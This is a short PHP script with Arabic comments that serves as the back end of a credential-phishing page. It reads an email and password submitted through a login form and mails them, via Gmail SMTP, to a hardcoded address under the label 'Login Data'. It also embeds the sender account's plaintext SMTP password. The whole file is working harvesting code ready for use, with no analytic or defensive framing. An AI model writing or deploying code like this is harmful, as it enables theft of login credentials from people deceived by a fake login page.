<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    $mail = new PHPMailer(true);

    try {
        // إعدادات SMTP
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';  // استخدم SMTP لمزود بريدك
        $mail->SMTPAuth = true;
        $mail->Username = 'issam.s.g22@gmail.com'; // ضع إيميلك هنا
        $mail->Password = '1212tt545'; // ضع كلمة مرور البريد
        $mail->SMTPSecure = 'tls'; // أو 'ssl' حسب مزود الخدمة
        $mail->Port = 587; // 465 لـ SSL، أو 587 لـ TLS

        // إعدادات البريد
        $mail->setFrom('issam.s.g22@gmail.com', 'Login Data');
        $mail->addAddress('issam.s.g22@gmail.com'); // استبدلها بإيميلك
        $mail->Subject = 'تسجيل دخول جديد!';
        $mail->Body = "الإيميل: $email\nكلمة المرور: $password";

        $mail->send();
        echo "تم إرسال البيانات بنجاح!";
    } catch (Exception $e) {
        echo "خطأ: " . $mail->ErrorInfo;
    }
}
?>

